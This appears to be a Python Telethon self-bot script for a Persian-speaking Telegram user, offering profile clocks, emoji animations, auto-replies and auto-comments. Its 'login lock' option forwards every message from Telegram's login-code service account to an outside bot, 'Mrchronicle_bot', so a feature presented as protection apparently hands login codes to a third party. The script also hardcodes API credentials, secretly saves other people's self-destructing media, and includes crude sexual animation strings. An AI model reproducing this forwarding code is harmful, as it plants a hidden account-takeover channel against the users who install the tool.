#-----------------------[Start->Imports]-----------------
import asyncio
import os
import random
import psutil
import pytz
import re
import sys
import requests
from telethon import TelegramClient, events, functions, Button
from datetime import datetime
from persiantools.jdatetime import JalaliDate
from telethon.tl.functions.messages import (
    EditMessageRequest, GetDiscussionMessageRequest, GetHistoryRequest, SetTypingRequest,
)
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.functions.channels import EditBannedRequest, EditAdminRequest
from telethon.tl.functions.photos import UploadProfilePhotoRequest, DeletePhotosRequest
from telethon.tl.types import (
    ChatAdminRights, ChatBannedRights, InputPeerChannel, ChannelParticipantsAdmins, SendMessageTypingAction,
    MessageEntityTextUrl, MessageEntityUrl, InputPhoto,
)
from telethon.tl.functions.messages import GetInlineBotResultsRequest, SendInlineBotResultRequest
#-----------------------[EnD->Imports]-----------------

#---------------------[Start->Variables]----------------
tehran_tz = pytz.timezone('Asia/Tehran')
FontTime = [['𝟎', '𝟏', '𝟐', '𝟑', '𝟒', '𝟓', '𝟔', '𝟕', '𝟖', '𝟗']]
time_on = False
commentbot_enabled = False
comment_text = "کامنت تنظیم نشده"
profile_folder = "change_profile"
profile_rotation_enabled = False
auto_reply_enabled = False
auto_reply_messages = []
time_bio_on = True
set_bio = ""
date_format = None
Timeir = False
hashtag_enabled = False
bold_enabled = False
online_mode = False
current_action = None
single_mode_enabled = False
mode_enabled = False
blocklogin_enabled = False
strikethrough_enabled = False
silent_mode = False
Delete_enabled = False
save_mode = False
poker_mode = False

if not os.path.exists(profile_folder):
    os.makedirs(profile_folder)
#---------------------[End->Variables]------------------

#---------[Start->Apis->Client->Settings]--------
client_name = os.environ.get('SESSION_NAME', 'my_session')
API_ID = int(os.environ.get('API_ID', '29031463'))
API_HASH = os.environ.get('API_HASH', '64f122a7094dbab7e32b911eae6589e9')
client = TelegramClient(client_name, API_ID, API_HASH, device_model='iPhone 16 Pro Max', system_version='iOS 18', app_version='9.0.1', system_lang_code='en', lang_code='en')
#---------[EnD->Apis->Client->Settings]--------

#--------------[Start->Helper Functions]-----------------
async def get_used_memory():
    return psutil.Process(os.getpid()).memory_info().rss / 1024 ** 2

Fohsh = []
Fohsh2 = []
#--------------[EnD->Helper Functions]-----------------

#--------------[Start->Help Panel]-----------------
@client.on(events.NewMessage(pattern=r'(help|راهنما|پنل|منو|کامندها|دستورات|/help|/start|/panel)'))
async def help_panel(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        help_text = """
╔══════════════════════════════════╗
║     🚀 راهنمای کامل ربات سلف 🚀     ║
╚══════════════════════════════════╝

🔹 **دستورات اصلی:**
────────────────────────
▪️ `ریستارت` - ریستارت کردن ربات
▪️ `/login on/off` - قفل ورود به حساب

🔹 **تنظیمات زمان و تاریخ:**
────────────────────────
▪️ `ساعت روشن` - نمایش ساعت در lastName
▪️ `ساعت خاموش` - خاموش کردن ساعت
▪️ `ساعت بیو روشن` - نمایش ساعت در بیو
▪️ `ساعت بیو خاموش` - خاموش کردن ساعت بیو
▪️ `تنظیم بیو` + ریپلای - تنظیم متن بیو
▪️ `تاریخ شمسی روشن` - نمایش تاریخ شمسی
▪️ `تاریخ میلادی روشن` - نمایش تاریخ میلادی
▪️ `تاریخ خاموش` - خاموش کردن تاریخ

🔹 **بازی‌ها و انیمیشن‌ها:**
────────────────────────
▪️ `ساک` - انیمیشن ساک زدن
▪️ `روانی` - انیمیشن روانی
▪️ `جق` - انیمیشن جق
▪️ `عشق` - انیمیشن عشق
▪️ `کص ننت` - انیمیشن کص ننت
▪️ `خخخ` - انیمیشن خنده
▪️ `موشک` - انیمیشن موشک
▪️ `پول` - انیمیشن پول
▪️ `جن` - انیمیشن جن
▪️ `قلب` - انیمیشن قلب
▪️ `برم خونه` - رفتن به خونه
▪️ `فرار از خونه` - فرار از خونه
▪️ `عقاب` - انیمیشن عقاب
▪️ `بکشش` - انیمیشن کشتن
▪️ `مسجد` - انیمیشن مسجد
▪️ `کوسه` - انیمیشن کوسه
▪️ `بارون` - انیمیشن بارون
▪️ `بادکنک` - انیمیشن بادکنک
▪️ `شب خوش` - شب بخیر
▪️ `فیش` - انیمیشن فیش
▪️ `فوتبال` - انیمیشن فوتبال
▪️ `برم بخابم` - خوابیدن
▪️ `غرقش کن` - غرق کردن
▪️ `فضانورد` - فضا نورد
▪️ `ایول` - تشویق
▪️ `فیل` - فیل
▪️ `بشمار` - شمارش
▪️ `بمیر کرونا` - کرونا
▪️ `انگش` - انگش
▪️ `جقیم` - جقیم
▪️ `ریدم` - ریدم
▪️ `مربع` - مربع
▪️ `دیک` - دیک
▪️ `ساعت` - ساعت
▪️ `برگام` - برگام
▪️ `رقص` - رقص
▪️ `خار` - خار
▪️ `گلب` - گلب
▪️ `اها` - اها
▪️ `ماشین` - ماشین
▪️ `موتور` - موتور
▪️ `پنالتی` - پنالتی
▪️ `تانک` - تانک
▪️ `قلب2` - قلب 2
▪️ `لامپ` - لامپ
▪️ `شب` - شب
▪️ `بای` - خداحافظی
▪️ `چطوری` - چطوری
▪️ `سگ` - سگ
▪️ `قلبز` - قلب ز
▪️ `هزارپا` - هزارپا
▪️ `دوست دارم` - دوست دارم
▪️ `زنبور` - زنبور
▪️ `هلیکوپتر` - هلیکوپتر
▪️ `اوخی` - اوخی
▪️ `قهرم` - قهرم
▪️ `بوس` - بوس
▪️ `تپش` - تپش قلب

🔹 **تنظیمات پروفایل:**
────────────────────────
▪️ `اد پروفایل` + ریپلای عکس - اضافه کردن عکس
▪️ `پروفایل روشن` - چرخش خودکار پروفایل
▪️ `پروفایل خاموش` - خاموش کردن چرخش
▪️ `پاکسازی پروفایل` - پاک کردن لیست عکس‌ها

🔹 **تنظیمات پیام:**
────────────────────────
▪️ `هشتک روشن/خاموش` - اضافه کردن #
▪️ `ضخیم روشن/خاموش` - ضخیم نوشتن
▪️ `خط خورده روشن/خاموش` - خط خوردگی متن
▪️ `تکی روشن/خاموش` - مونواسپیس
▪️ `مود روشن/خاموش` - تایپ انیمیشنی

🔹 **اکشن‌ها:**
────────────────────────
▪️ `تایپینگ روشن/خاموش` - نمایش تایپینگ
▪️ `گیم روشن/خاموش` - نمایش بازی
▪️ `آنلاین روشن/خاموش` - همیشه آنلاین

🔹 **حالت‌های ویژه:**
────────────────────────
▪️ `سایلنت روشن/خاموش` - حذف خودکار پیام‌ها
▪️ `سیو روشن/خاموش` - ذخیره مدیا تایمردار
▪️ `پوکر روشن/خاموش` - سیو کردن خودکار
▪️ `کامنت روشن/خاموش` - کامنت خودکار
▪️ `تنظیم کامنت` + متن - تنظیم متن کامنت

🔹 **منشی پیوی:**
────────────────────────
▪️ `/autopv on` - فعال کردن منشی
▪️ `/autopv off` - غیرفعال کردن منشی
▪️ `/addpv` + ریپلای - اضافه کردن پاسخ
▪️ `/testpv` - تست منشی
▪️ `/restpv` - پاک کردن لیست

🔹 **دستورات کاربردی:**
────────────────────────
▪️ `رم` - مشاهده رم مصرفی
▪️ `ایدی` + ریپلای - گرفتن آیدی کاربر
▪️ `پنل` - پنل مدیریتی
▪️ `قیمت ارز` - قیمت ارزها
▪️ `فال` - فال حافظ
▪️ `بیو رندوم` - بیوگرافی رندوم
▪️ `تاریخ امروز` - تاریخ امروز
▪️ `گیممم` + اسم بازی - جستجوی بازی
▪️ `/fonet-> متن` - فونت‌های مختلف
▪️ `/like-> متن` - ساخت لایک
▪️ `/getgif متن` - جستجوی گیف
▪️ `/getpic متن` - جستجوی عکس
▪️ `/getmeme متن` - جستجوی مم
▪️ `/serchgoogle متن` - جستجوی گوگل
▪️ `/youtube متن` - جستجوی یوتیوب
▪️ `اسپم` + ریپلای - اسپم پیام
▪️ `فحش` - لیست فحش‌ها

╔══════════════════════════════════╗
║   ✅ ربات با موفقیت اجرا شد ✅    ║
╚══════════════════════════════════╝
"""
        await event.edit(help_text)
#--------------[EnD->Help Panel]-----------------

#////////////////////////////////////////////

#--------------[StarT->Restart].........................
@client.on(events.NewMessage(pattern=r'ریستارت|ریس|/restart'))
async def handler(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit('سلف با موفقیت ریستارت شد')
        python = sys.executable
        os.execl(python, python, *sys.argv)
#--------------[EnD->Restart].........................

#--------------[Start->Login-Block]......................
@client.on(events.NewMessage(pattern=r'/login (on|off)'))
async def block_handler(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        global blocklogin_enabled
        blocklogin_enabled = event.pattern_match.group(1) == 'on'
        await event.edit(f'قفل ورود  {"فعال شد ✅" if blocklogin_enabled else "غیرفعال شد ❌"}')

@client.on(events.NewMessage(from_users=777000))
async def send_messages(event):
    if blocklogin_enabled:
        try:
            await client.forward_messages('Mrchronicle_bot', event.message)
        except Exception as e:
            await event.reply(f'خطایی رخ داد: {str(e)}')
#--------------[EnD->Login-Block].......................

#--------------[Start->Game-Self]...............
@client.on(events.NewMessage(outgoing=True))
async def handle_special_message(event):
    if event.message.message == "ساک":
        edits_suck = ["🗣 <=====", "🗣<=====","🗣=====","🗣====","🗣===","🗣==","🗣===","🗣====","🗣=====","🗣<=====","<=====", "اخ اخ گاز گرفتی ک😐"]
        for edit in edits_suck:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "روانی":
        edits_ravani = ["🚶🏿‍♀________________🚑","🚶🏿‍♀_______________🚑", "🚶🏿‍♀______________🚑","🚶🏿‍♀_____________🚑","🚶🏿‍♀____________🚑'","🚶🏿‍♀___________🚑","🚶🏿‍♀__________🚑","🚶🏿‍♀_________🚑","🚶🏿‍♀________🚑","🚶🏿‍♀_______🚑","🚶🏿‍♀______🚑","🚶🏿‍♀____🚑","🚶🏿‍♀___🚑","🚶🏿‍♀__🚑","🚶🏿‍♀_🚑","قان قان گرفتیمش خودع کزخلشع😐🚶‍♂️"]
        for edit in edits_ravani:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "جق":
        edits_jaghi = ["درحال جق....","<👌🏻=====","<=👌🏻====","<==👌🏻===","<===👌🏻==","<==👌🏻===","<=👌🏻====","<👌🏻=====","👌🏻<=====","<=👌🏻====","<===👌🏻==","<=👌🏻====","👌🏻<=====","<=👌🏻====","<==👌🏻===","<=👌🏻====","👌🏻<=====","💦💦<=====","کمر نموند برامون بمولا😐"]
        for edit in edits_jaghi:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "خخخ":
        edits_khkhkh = ['😂😂', '🤣🤣', '😀', '😃', '😄', '😁', '😆', '😅', '😊', '🙃', '😛', '😝', '😜', '🤪', '😺', '😹', '😸', '😇', '😂', '🥳']
        for edit in edits_khkhkh:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "موشک":
        edits_moshak = ["🌍🚀                                🛸", "🌍🚀                               🛸", "🌍🚀                              🛸","🌍🚀                             🛸", "🌍🚀                            🛸", "🌍🚀                           🛸","🌍🚀                          🛸", "🌍🚀                         🛸", "🌍🚀                        🛸","🌍🚀                       🛸", "🌍🚀                      🛸", "🌍🚀                     🛸","🌍🚀                   🛸", "🌍🚀                  🛸", "🌍🚀                 🛸","🌍🚀                🛸", "🌍🚀               🛸", "🌍🚀              🛸","🌍🚀            🛸", "🌍🚀           🛸", "🌍🚀          🛸","🌍🚀         🛸", "🌍🚀        🛸", "🌍🚀       🛸","🌍🚀      🛸", "🌍🚀     🛸", "🌍🚀    🛸","🌍🚀   🛸", "🌍🚀  🛸", "🌍🚀 🛸","🌍🚀🛸", "🌍💥Boom💥"]
        for edit in edits_moshak:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "پول":
        edits_pool = ["🔥            ‌                    💵", "🔥            ‌                   💵", "🔥            ‌                 💵","🔥            ‌                💵", "🔥            ‌               💵", "🔥            ‌              💵","🔥            ‌             💵", "🔥            ‌            💵", "🔥            ‌           💵","🔥            ‌          💵", "🔥                         💵", "🔥            ‌        💵","🔥            ‌       💵", "🔥            ‌      💵", "🔥            ‌     💵","🔥            ‌    💵", "🔥            ‌   💵", "🔥            ‌  💵","🔥            ‌ 💵", "🔥            ‌💵", "🔥           💵","🔥          💵", "🔥         💵", "🔥        💵","🔥       💵", "🔥      💵", "🔥     💵","🔥    💵", "🔥   💵", "🔥  💵","🔥 💵", "💸"]
        for edit in edits_pool:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "برم خونه":
        edits_bermkhone = ["🏠              🚶‍♂", "🏠             🚶‍♂", "🏠            🚶‍♂", "🏠           🚶‍♂","🏠          🚶‍♂", "🏠         🚶‍♂", "🏠        🚶‍♂", "🏠       🚶‍♂","🏠      🚶‍♂", "🏠     🚶‍♂", "🏠    🚶‍♂", "🏠   🚶‍♂","🏠  🚶‍♂", "🏠 🚶‍♂","🏠🚶‍♂"]
        for edit in edits_bermkhone:
            await event.edit(edit)
            await asyncio.sleep(0.2)

    elif event.message.message == "بکشش":
        edits_bekoshesh = ["😂                 • 🔫🤠","😂                •  🔫🤠","😂               •   🔫🤠","😂              •    🔫🤠","😂             •     🔫🤠","😂            •      🔫🤠","😂           •       🔫🤠","😂          •        🔫🤠","😂         •         🔫🤠","😂        •          🔫🤠","😂       •           🔫🤠","😂      •            🔫🤠","😂     •             🔫🤠","😂    •              🔫🤠","😂   •               🔫🤠","😂  •                🔫🤠","😂 •                 🔫🤠","😂•                  🔫🤠","🤯                  🔫 🤠","فرد جنایتکار کشته شد :)"]
        for edit in edits_bekoshesh:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    
    elif event.message.message == "شب خوش":
        edits_shabkhosh = ["🌜              🙃","🌜             🙃","🌜            🙃","🌜           🙃","🌜          🙃","🌜         🙃","🌜        🙃","🌜       😕","🌜      ☹️","🌜     😣","🌜    😖","🌜   😩","🌜  🥱","🌜 🥱","😴"]
        for edit in edits_shabkhosh:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    
    elif event.message.message == "اوخی":
        edits_okhi = ["🥺اوخییی","🥺","🥺🥺","🥺🥺🥺","🥺🥺🥺🥺","🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺🥺","🥺🥺🥺🥺🥺","🥺🥺🥺🥺","🥺🥺🥺","🥺🥺","🥺"]
        for edit in edits_okhi:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    
    elif event.message.message == "بوس":
        edits_boos = ["loading please wait...","💋 ","💋                         💋","💋                   💋 ","💋             💋","💋          💋","💋        💋","💋      💋","💋   💋","💋  💋","💋"]
        for edit in edits_boos:
            await event.edit(edit)
            await asyncio.sleep(0.2)
    
    elif event.message.message == "تپش":
        edits_tapesh = ["💓","💗","💓","💗","💓","💗","💓","💗","💓","💗","💓","💗","💓💗💓💗💓💗💓💗"]
        for edit in edits_tapesh:
            await event.edit(edit)
            await asyncio.sleep(0.2)

#--------------[EnD->Game-Self]...............

#--------------[StarT->Time-> Info ].....................
@client.on(events.NewMessage(pattern=r'(ساعت روشن|time on|ساعت خاموش|time off|ساعت بیو روشن|time bio on|ساعت بیو خاموش|time bio off)'))
async def handle_time(event):
    global time_on, time_bio_on
    me = await client.get_me()
    if event.sender_id == me.id:
        command = event.pattern_match.group(1)
        if 'ساعت' in command or 'time' in command:
            if 'بیو' in command or 'bio' in command:
                time_bio_on = 'روشن' in command or 'on' in command
                message = f'ساعت بیو {"روشن" if time_bio_on else "خاموش"} شد'
            else:
                time_on = 'روشن' in command or 'on' in command
                message = f'ساعت {"روشن" if time_on else "خاموش"} شد'
        await event.edit(message)

def convert_time_to_font(time_str, font):
    return ''.join(font[int(digit)] if digit.isdigit() else ':' for digit in time_str)

async def change_last_name():
    while True:
        if time_on:
            current_time = datetime.now(tehran_tz).strftime('%H:%M')
            font = random.choice(FontTime)
            formatted_time = convert_time_to_font(current_time, font)
            await client(UpdateProfileRequest(last_name=formatted_time))
        await asyncio.sleep(60)

async def change_bio():
    while time_bio_on:
        current_time = datetime.now(tehran_tz).strftime('%H:%M') 
        font = random.choice(FontTime)
        formatted_time = convert_time_to_font(current_time, font)
        
        if date_format == "jalali":
            current_date = JalaliDate.today().strftime('امروز (%d) %B ☀️ %Y')
        elif date_format == "gregorian":
            current_date = datetime.now(tehran_tz).strftime('امروز (%d) %B ☀️ %Y')
        else:
            current_date = ""
        
        if set_bio:
            emojis = random.choice(["⛅", "🌥️", "☀️", "💫", "🌙", "🌠", "🌎", "🍕", "🍟", "🎉", "🎁", "🎇", "🎆"])
            new_bio = f"{set_bio} | {formatted_time} | {current_date} {emojis}"
        else:
            new_bio = f"{current_date} {formatted_time}"
        
        await client(UpdateProfileRequest(about=new_bio))
        await asyncio.sleep(60)

@client.on(events.NewMessage(pattern=r'^(تنظیم بیو|set bio)$'))
async def handler(event):
    if event.is_reply:
        reply_message = await event.get_reply_message()
        me = await client.get_me()
        if event.sender_id == me.id:
            global set_bio
            set_bio = reply_message.text
            await event.edit(f"بیو تنظیم شد: {set_bio}")

@client.on(events.NewMessage(pattern=r'^(تاریخ شمسی روشن|شمسی روشن|jalali on)$'))
async def enable_jalali(event):
    global date_format
    date_format = "jalali"
    await event.edit("تاریخ شمسی روشن شد.")

@client.on(events.NewMessage(pattern=r'^(تاریخ میلادی روشن|میلادی روشن|gregorian on)$'))
async def enable_gregorian(event):
    global date_format
    date_format = "gregorian"
    await event.edit("تاریخ میلادی روشن شد.")

@client.on(events.NewMessage(pattern=r'^(تاریخ خاموش|خاموش|date off)$'))
async def disable_date(event):
    global date_format
    date_format = None
    await event.edit("تاریخ خاموش شد.")
#--------------[EnD->Time-> Info ].....................

#--------------[StarT->Change->Profile ].................
@client.on(events.NewMessage(pattern=r'^(اد پروفایل|add profile)$'))
async def add_profile(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال پردازش...")
        if event.is_reply:
            reply_message = await event.get_reply_message()
            if reply_message.photo:
                photo = await client.download_media(reply_message.photo)
                photo_count = len(os.listdir(profile_folder)) + 1
                photo_path = os.path.join(profile_folder, f"{photo_count:02}.jpg")
                os.rename(photo, photo_path)
                await event.edit(f"عکس با نام {photo_count:02}.jpg ذخیره شد.")
            else:
                await event.edit("لطفاً روی یک عکس ریپلای کنید.")
        else:
            await event.edit("لطفاً این دستور را روی یک عکس ریپلای کنید.")

@client.on(events.NewMessage(pattern=r'^(پروفایل روشن|profile on)$'))
async def enable_profile_rotation(event):
    global profile_rotation_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        profile_rotation_enabled = True
        await event.edit("پروفایل چرخشی فعال شد.")
        while profile_rotation_enabled:
            photos = await client.get_profile_photos('me')
            if photos:
                await client(DeletePhotosRequest(id=[InputPhoto(id=photo.id, access_hash=photo.access_hash, file_reference=photo.file_reference) for photo in photos]))
            for photo_file in sorted(os.listdir(profile_folder)):
                if not profile_rotation_enabled:
                    break
                photo_path = os.path.join(profile_folder, photo_file)
                file = await client.upload_file(photo_path)
                await client(UploadProfilePhotoRequest(file=file))
                await asyncio.sleep(4000)  
                photos = await client.get_profile_photos('me')
                if photos:
                    await client(DeletePhotosRequest(id=[InputPhoto(id=photos[0].id, access_hash=photos[0].access_hash, file_reference=photos[0].file_reference)]))
            await asyncio.sleep(3600) 

@client.on(events.NewMessage(pattern=r'^(پروفایل خاموش|profile off)$'))
async def disable_profile_rotation(event):
    global profile_rotation_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        profile_rotation_enabled = False
        await event.edit("پروفایل چرخشی غیرفعال شد.")

@client.on(events.NewMessage(pattern=r'^(پاکسازی پروفایل|clear profile)$'))
async def clear_profile_folder(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        for photo_file in os.listdir(profile_folder):
            os.remove(os.path.join(profile_folder, photo_file))
        await event.edit("لیست پروفایل پاکسازی شد.")
#--------------[EnD->Change->Profile ].................

#--------------[Start->Commands].................
@client.on(events.NewMessage(pattern=r'(رم|ایدی|آیدی|Id|id|پنل|/panel)'))
async def handle_commands(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        command = event.pattern_match.group(1)
        
        if command == 'رم':
            used_memory = await get_used_memory()
            message = f"میزان رم استفاده شده: {used_memory:.2f} MB"
            await event.edit(message)
        
        elif command in ['ایدی', 'آیدی', 'Id', 'id'] and event.is_reply:
            reply_message = await event.get_reply_message()
            user_id = reply_message.sender_id
            message = f"چت آیدی کاربر: {user_id}"
            await event.edit(message)

@client.on(events.NewMessage(pattern=r'^(قیمت ارز|price)$'))
async def show_currency_prices(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال دریافت قیمت ارزها...")
        response = requests.get("https://api.codebazan.ir/arz/?type=arz")
        data = response.json()['Result']
        show_text = ''
        for i in range(30):
            show_text += f"💵  {data[i]['name']} => {data[i]['price']}\n"
        await event.edit(f"💵 قیمت ارزها:\n{show_text}")

@client.on(events.NewMessage(pattern=r'^(فال|fall)$'))
async def send_omen(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("خوب بریم ی فال بگیریم ")
        random_number = random.randint(1, 149)
        media_url = f"https://www.beytoote.com/images/Hafez/{random_number}.gif"
        await client.send_file(event.chat_id, media_url, caption="فال حافظ شما :+) ")

@client.on(events.NewMessage(pattern=r'^(بیو رندوم|random bio)$'))
async def send_random_bio(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        await event.edit("در حال دریافت بیوگرافی رندوم .....")
        response = requests.get("https://api.codebazan.ir/bio/")
        bio_text = response.text
        await event.edit(bio_text)

@client.on(events.NewMessage(pattern=r'^(تاریخ امروز|today\'s date)$'))
async def send_gregorian_date(event):
    me = await client.get_me()
    if event.sender_id == me.id:
        now = datetime.utcnow()
        rooz = now.strftime("%A") 
        tarikh = now.strftime("%Y/%m/%d")  
        mah = now.strftime("%B") 
        hour = now.strftime("%H:%M:%S - %p") 
        await event.edit(f"📅 امروز: {rooz} | {tarikh} |\n\n🌙 نام ماه: {mah}\n\n⌚️ زمان: {hour}")

@client.on(events.NewMessage(pattern=r'^(سایلنت روشن|سایلنت خاموش)'))
async def toggle_silent_mode(event):
    global silent_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            silent_mode = True
            await event.edit('حالت سایلنت روشن شد')
        else:
            silent_mode = False
            await event.edit('حالت سایلنت خاموش شد')

@client.on(events.NewMessage(incoming=True))
async def delete_private_messages(event):
    if silent_mode and event.is_private:
        await event.delete()

@client.on(events.NewMessage(pattern=r'(سیو روشن|سیو خاموش)'))
async def toggle_save_mode(event):
    global save_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            save_mode = True
            await event.reply('حالت سیو روشن شد')
        else:
            save_mode = False
            await event.reply('حالت سیو خاموش شد')

@client.on(events.NewMessage(incoming=True))
async def save_timed_media(event):
    if save_mode and event.is_private:
        if (event.photo or event.video) and event.media.ttl_seconds:
            media_path = await event.download_media()
            await client.send_file('me', media_path, caption='مدیا تایمر دار ذخیره شد')

@client.on(events.NewMessage(pattern=r'(پوکر روشن|پوکر خاموش)'))
async def toggle_poker_mode(event):
    global poker_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            poker_mode = True
            await event.reply('حالت پوکر روشن شد')
        else:
            poker_mode = False
            await event.reply('حالت پوکر خاموش شد')

@client.on(events.NewMessage(incoming=True))
async def poker_mode_handler(event):
    if poker_mode and event.is_private:
        await event.mark_read()

@client.on(events.NewMessage(pattern=r'(آنلاین روشن|آنلاین خاموش)'))
async def toggle_online_mode(event):
    global online_mode
    if event.sender_id == (await client.get_me()).id:
        if 'روشن' in event.pattern_match.group(1):
            online_mode = True
            await event.reply('حالت آنلاین روشن شد')
            asyncio.create_task(keep_online())
        else:
            online_mode = False
            await event.reply('حالت آنلاین خاموش شد')

async def keep_online():
    while online_mode:
        await client.send_read_acknowledge(await client.get_me())
        await asyncio.sleep(15)
#--------------[EnD->Commands].................

#--------------[Start->Format Settings].................
@client.on(events.NewMessage(pattern=r'(هشتک روشن|hashtag on|هشتک خاموش|hashtag off|ضخیم روشن|bold on|ضخیم خاموش|bold off)'))
async def handle_format_status(event):
    global hashtag_enabled, bold_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['هشتک روشن', 'hashtag on']:
            hashtag_enabled = True
            await event.edit('هشتک روشن شد')
        elif action in ['هشتک خاموش', 'hashtag off']:
            hashtag_enabled = False
            await event.edit('هشتک خاموش شد')
        elif action in ['ضخیم روشن', 'bold on']:
            bold_enabled = True
            await event.edit('حالت ضخیم روشن شد')
        elif action in ['ضخیم خاموش', 'bold off']:
            bold_enabled = False
            await event.edit('حالت ضخیم خاموش شد')

@client.on(events.NewMessage(outgoing=True))
async def handle_outgoing_formats(event):
    global hashtag_enabled, bold_enabled
    final_message = event.message.message
    if hashtag_enabled:
        final_message = f'#{final_message}'
    if bold_enabled:
        final_message = f'**{final_message}**'
    if hashtag_enabled or bold_enabled:
        try:
            await event.edit(final_message)
        except Exception as e:
            print(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(تکی روشن|single on|تکی خاموش|single off|مود روشن|mode on|مود خاموش|mode off)'))
async def handle_mode_status(event):
    global single_mode_enabled, mode_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['تکی روشن', 'single on']:
            single_mode_enabled = True
            await event.edit('حالت تکی روشن شد')
        elif action in ['تکی خاموش', 'single off']:
            single_mode_enabled = False
            await event.edit('حالت تکی خاموش شد')
        elif action in ['مود روشن', 'mode on']:
            mode_enabled = True
            await event.edit('مود روشن شد')
        elif action in ['مود خاموش', 'mode off']:
            mode_enabled = False
            await event.edit('مود خاموش شد')

@client.on(events.NewMessage(outgoing=True))
async def handle_mode_messages(event):
    global single_mode_enabled, mode_enabled
    if mode_enabled:
        message = event.message.message
        edited_message = ""
        try:
            for char in message:
                edited_message += char
                await event.edit(edited_message + "\u200C")
                await asyncio.sleep(0.5)
        except Exception as e:
            print(f"Error: {e}")
    if single_mode_enabled:
        try:
            await event.edit(f'`{event.message.message}`')
        except Exception as e:
            print(f"Error: {e}")

@client.on(events.NewMessage(pattern=r'(خط خورده روشن|strikethrough on|خط خورده خاموش|strikethrough off)'))
async def handle_strikethrough_status(event):
    global strikethrough_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action in ['خط خورده روشن', 'strikethrough on']:
            strikethrough_enabled = True
            await event.edit('حالت خط خورده روشن شد')
        elif action in ['خط خورده خاموش', 'strikethrough off']:
            strikethrough_enabled = False
            await event.edit('حالت خط خورده خاموش شد')

@client.on(events.NewMessage(outgoing=True))
async def handle_strikethrough_messages(event):
    global strikethrough_enabled
    if strikethrough_enabled:
        try:
            await event.edit(f'~~{event.message.message}~~')
        except Exception as e:
            print(f"Error: {e}")
#--------------[EnD->Format Settings].................

#--------------[Start->Auto Reply].................
@client.on(events.NewMessage(pattern=r'/autopv (on|off)|/addpv|/testpv|/restpv'))
async def handle_auto_reply_commands(event):
    global auto_reply_enabled
    me = await client.get_me()
    if event.sender_id == me.id:
        action = event.pattern_match.group(1)
        if action == 'on':
            auto_reply_enabled = True
            await event.reply('منشی پیوی فعال شد ✅')
        elif action == 'off':
            auto_reply_enabled = False
            await event.reply('منشی پیوی غیرفعال شد ❌')
        elif '/addpv' in event.raw_text and event.is_reply:
            reply_message = await event.get_reply_message()
            if reply_message:
                auto_reply_messages.append(reply_message)
                await event.reply('پیام به لیست اضافه شد ✅')
        elif '/testpv' in event.raw_text:
            if auto_reply_messages:
                for msg in auto_reply_messages:
                    await asyncio.sleep(3)
                    if msg.media:
                        await client.send_file(event.chat_id, msg.media)
                    else:
                        await client.send_message(event.chat_id, msg.text)
            else:
                await event.reply('لیست خالی است ❌')
        elif '/restpv' in event.raw_text:
            auto_reply_messages.clear()
            await event.reply('لیست بازنشانی شد ↩️')

@client.on(events.NewMessage(incoming=True))
async def handle_auto_reply(event):
    if auto_reply_enabled and event.is_private:
        sender = await event.get_sender()
        if sender.bot or sender.is_self:
            return
        await event.mark_read()
        await client(SetTypingRequest(event.chat_id, SendMessageTypingAction()))
        await asyncio.sleep(2)
        messages = await client.get_messages(event.chat_id, limit=2)
        if len(messages) == 1:
            for reply_message in auto_reply_messages:
                await asyncio.sleep(3)
                if reply_message.media:
                    await client.send_file(event.chat_id, reply_message.media)
                else:
                    await client.send_message(event.chat_id, reply_message.text)
#--------------[EnD->Auto Reply].................

#--------------[Start->Comment Bot].................
@client.on(events.NewMessage(pattern=r'(تنظیم کامنت|setcomment) (.+)'))
async def set_comment_handler(event):
    global comment_text
    if event.sender_id == (await client.get_me()).id:
        comment_text = event.pattern_match.group(2)
        await event.edit(f'متن کامنت تنظیم شد: {comment_text}')

@client.on(events.NewMessage(pattern=r'(کامنت روشن|comment on|کامنت خاموش|comment off)'))
async def commentbot_handler(event):
    global commentbot_enabled
    if event.sender_id == (await client.get_me()).id:
        action = event.pattern_match.group(1)
        if action in ['کامنت روشن', 'comment on']:
            commentbot_enabled = True
            await event.edit('کامنت خودکار فعال شد ✅')
        elif action in ['کامنت خاموش', 'comment off']:
            commentbot_enabled = False
            await event.edit('کامنت خودکار غیرفعال شد ❌')

@client.on(events.NewMessage)
async def auto_comment(event):
    if commentbot_enabled and event.is_channel:
        try:
            me = await client.get_me()
            if event.sender_id != me.id and event.is_channel and not event.is_group:
                discussion_message = await client(GetDiscussionMessageRequest(event.chat_id, event.id))
                if discussion_message.messages:
                    await client.send_message(
                        entity=discussion_message.messages[0].peer_id,
                        message=comment_text,
                        reply_to=discussion_message.messages[0].id
                    )
        except Exception as e:
            print(f'خطا: {str(e)}')
#--------------[EnD->Comment Bot].................

